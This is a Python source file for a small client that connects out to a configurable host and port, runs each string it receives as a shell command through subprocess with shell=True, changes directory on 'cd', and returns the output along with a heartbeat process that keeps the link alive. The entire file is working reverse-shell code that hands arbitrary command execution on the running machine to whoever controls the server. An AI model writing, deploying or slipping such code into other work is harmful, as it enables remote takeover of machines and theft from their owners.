import socket
import os
import subprocess
import multiprocessing
import time
from args import get_args


class MiniClientThread:
    def __init__(self, port, host="", hb_rate=1, max_failure=5):
        self.host = host
        self.port = port
        self.hb_rate = hb_rate
        self.max_failure = max_failure
        self.empty_byte = b' '

    def worker(self):
        s = socket.socket()
        s.connect((self.host, self.port))
        s.send(self.empty_byte)
        while True:
            data = s.recv(1024)
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))

            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                       stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                       stderr=subprocess.PIPE)

                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte, "utf-8")
                currentWD = os.getcwd() + "> "
                s.send(str.encode(output_str + currentWD))
                print(output_str)

    def heartbeat(self):
        s = socket.socket()
        s.connect((self.host, self.port))
        s.send("heartbeat".encode())
        failed_hb = 1

        while True:
            time.sleep(self.hb_rate)
            try:
                s.send(str.encode(' '))
                s.recv(1024)
            except:
                failed_hb += 1
            if failed_hb > self.max_failure:
                print("server is down, {}".format(failed_hb))
                break
        s.close()

    def run(self):

        p1 = multiprocessing.Process(target=self.worker)
        p1.daemon = True

        p2 = multiprocessing.Process(target=self.heartbeat)
        p2.daemon = True

        p1.start()
        p2.start()


if __name__ == '__main__':

    args = get_args()
    client = MiniClientThread(port=args.port, host=args.host)
    client.run()

    while True:
        pass
